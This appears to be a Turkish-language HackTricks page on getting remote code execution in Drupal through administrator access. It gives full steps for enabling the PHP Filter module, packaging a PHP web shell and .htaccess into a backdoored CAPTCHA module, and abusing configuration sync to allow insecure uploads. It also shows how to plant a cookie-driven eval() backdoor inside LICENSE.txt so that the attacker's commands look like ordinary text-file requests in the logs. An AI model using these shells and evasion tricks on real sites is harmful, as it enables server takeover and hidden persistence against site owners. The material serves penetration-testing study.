# Drupal RCE

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

## PHP Filtre Modülü ile

{% hint style="warning" %}
Drupal'ın **(8. sürümden önceki sürümlerinde)** eski sürümlerinde, bir yönetici olarak giriş yaparak **`PHP filtresi` modülünü etkinleştirmek** mümkündü, bu da "Gömülü PHP kodlarının değerlendirilmesine izin verir." Ancak 8. sürümden itibaren bu modül varsayılan olarak yüklenmez.
{% endhint %}

**Eklenti php'nin yüklü olması gerekiyor** (bunu kontrol etmek için _/modules/php_ adresine erişerek kontrol edin ve eğer **403** dönüyorsa, **mevcut**, eğer **bulunamadıysa**, o zaman **php eklentisi yüklü değil** demektir)

_Modüller_ -> (**Kontrol Et**) _PHP Filtresi_ -> _Yapılandırmayı Kaydet_

![](<../../../.gitbook/assets/image (247) (1).png>)

Ardından _İçerik Ekle_'ye tıklayın -> _Temel Sayfa_ veya _Makale_ seçin -> _Gövdede php kabuk kodunu yazın_ -> _Metin formatında_ _PHP kodu_ seçin -> _Önizleme_ seçin

![](<../../../.gitbook/assets/image (338).png>)

Son olarak, sadece yeni oluşturulan düğüme erişin:
```bash
curl http://drupal-site.local/node/3
```
## PHP Filtre Modülünü Yükle

{% hint style="warning" %}
Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web'e erişim sağlayarak eklentileri yüklemek artık mümkün değil.
{% endhint %}

**8 ve sonraki sürümlerde**, [**PHP Filtre**](https://www.drupal.org/project/php/releases/8.x-1.1) **modülü artık varsayılan olarak yüklenmiyor**. Bu işlevselliği kullanabilmek için **modülü kendimiz yüklememiz gerekecek**.

1. Modülün en güncel sürümünü Drupal web sitesinden indirin.
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. İndirildikten sonra **`Yönetim`** > **`Raporlar`** > **`Kullanılabilir güncellemeler`** bölümüne gidin.
4. **`Göz at`**'e tıklayın, dosyayı indirdiğimiz dizinden seçin ve ardından **`Yükle`**'ye tıklayın.
5. Modül yüklendikten sonra **`İçerik`**'e tıklayarak **yeni bir temel sayfa oluşturun**, Drupal 7 örneğinde yaptığımız gibi. Yine, **`Metin biçimi` açılır menüsünden `PHP kodu`'nu seçtiğinizden emin olun**.

## Arka Kapılı Modül

{% hint style="warning" %}
Mevcut sürümlerde, varsayılan kurulumdan sonra yalnızca web'e erişim sağlayarak eklentileri yüklemek artık mümkün değil.
{% endhint %}

Bir arka kapılı modül, **mevcut bir modüle bir kabuk ekleyerek oluşturulabilir**. Modüller drupal.org web sitesinde bulunabilir. [CAPTCHA](https://www.drupal.org/project/captcha) gibi bir modül seçelim. Aşağı kaydırın ve tar.gz [arşivi](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) için bağlantıyı kopyalayın.

* Arşivi indirin ve içeriğini çıkarın.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* İçeriği olan bir **PHP web kabuğu** oluşturun:
```php
<?php
system($_GET["cmd"]);
?>
```
* Ardından, kendimize klasöre erişim sağlamak için bir **`.htaccess`** dosyası oluşturmamız gerekmektedir. Bu, Drupal'ın **`/modules`** klasörüne doğrudan erişimi reddettiği için gereklidir.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Yukarıdaki yapılandırma, /modules içinde bir dosya istediğimizde / klasörü için kurallar uygulayacaktır. Bu dosyaların her ikisini de captcha klasörüne kopyalayın ve bir arşiv oluşturun.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Website'ye **yönetici erişimi** olduğunu varsayarak, **`Yönet`** üzerine tıklayın ve ardından kenar çubuğunda **`Genişlet`** seçeneğine tıklayın. Daha sonra **`+ Yeni modül yükle`** düğmesine tıklayarak yükleme sayfasına yönlendirileceksiniz, örneğin `http://drupal-site.local/admin/modules/install` Bağlantısına giderek backdoorlu Captcha arşivine göz atın ve **`Yükle`**'ye tıklayın.
* Kurulum başarılı olduğunda, komutları yürütmek için **`/modules/captcha/shell.php`** sayfasına gidin.

## Drupal'ı Yapılandırma Senkronizasyonu ile Backdoor Ekleme <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Tarafından paylaşılan yazı** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Bölüm 1 (_Media_ ve _Media Kütüphanesi_ etkinleştirme)

_Etend_ menüsünde (/admin/modules), zaten yüklü gibi görünen eklentileri etkinleştirebilirsiniz. Varsayılan olarak, _Media_ ve _Media Kütüphanesi_ eklentilerinin etkin olmadığı görünüyor, bu yüzden onları etkinleştirelim.

Etkinleştirmeden önce:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Etkinleştirdikten sonra:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Bölüm 2 (_Yapılandırma senkronizasyonu_ özelliğinden faydalanma) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupal yapılandırma girişlerini dökümlemek (dışa aktarmak) ve yüklemek (içe aktarmak) için _Yapılandırma senkronizasyonu_ özelliğinden faydalanacağız:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Sistem dosyasını yama system.file.yml**

İlk girişi yamalamaya başlayalım `allow_insecure_uploads`'den:

Dosya: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Dosya: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**field.field.media.document.field\_media\_document.yml** dosyasını yamultayın

Daha sonra, ikinci girişi şu şekilde yamultayın: 

Dosya: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Dosya: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Bu blog yazısında kullanmasam da, giriş `file_directory`'nin keyfi bir şekilde tanımlanabileceği ve yol travması saldırısına açık olduğu belirtilmiştir (bu sayede Drupal dosya sistemi ağacı içinde yukarı çıkabiliriz).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Bölüm 3 (özellik _Belge Ekleme_ kullanımı) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Son adım en basittir ve iki alt adıma ayrılır. İlk adım, .htaccess formatında bir dosya yüklemek ve Apache direktiflerini kullanarak .txt dosyalarının PHP motoru tarafından yorumlanmasına izin vermek için. İkinci adım ise payload içeren bir .txt dosyasını yüklemektir.

Dosya: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Neden bu hile harika?

Çünkü Webshell (ki ona LICENSE.txt diyeceğiz) Web sunucusuna bırakıldığında, komutlarımızı `$_COOKIE` üzerinden iletebiliriz ve Web sunucusu günlüklerinde bu, metin dosyasına yapılmış meşru bir GET isteği olarak görünecektir.

Neden Webshell'imize LICENSE.txt adını verdik?

Basitçe çünkü örneğin şu dosyayı alırsak [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (ki zaten Drupal çekirdeğinde bulunmaktadır), 339 satır ve 17.6 KB boyutunda bir dosyaya sahibiz, ki bu dosyaya PHP kodunun küçük bir parçasını eklemek için mükemmeldir (çünkü dosya yeterince büyüktür).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Dosya: Yamasız LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Bölüm 3.1 (dosya yükleme .htaccess)**

İlk olarak, Apache direktiflerini içeren dosyamızı yüklemek için _Add Document_ (/media/add/document) özelliğini kullanıyoruz.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Bölüm 3.2 (dosya yükleme LICENSE.txt)**

Ardından, lisans dosyası içinde gizlenmiş bir Webshell yüklemek için _Add Document_ (/media/add/document) özelliğini tekrar kullanıyoruz.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Bölüm 4 (Webshell ile etkileşim) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Son bölüm, Webshell ile etkileşimde bulunmayı içerir.

Aşağıdaki ekran görüntüsünde gösterildiği gibi, Webshell tarafından beklenen çerez tanımlanmamışsa, dosyayı bir Web tarayıcısı aracılığıyla danıştığımızda sonuç aşağıdaki gibi olur.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Saldırgan çerezi ayarladığında, Webshell ile etkileşimde bulunabilir ve istediği herhangi bir komutu çalıştırabilir.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Ve loglarda gördüğünüz gibi, yalnızca bir txt dosyasının istendiği görünüyor.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Bu makaleyi okuduğunuz için teşekkür ederim, umarım size bazı kabuklar elde etmenize yardımcı olur.

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 **Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya **telegram grubuna** [**katılın**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.

</details>
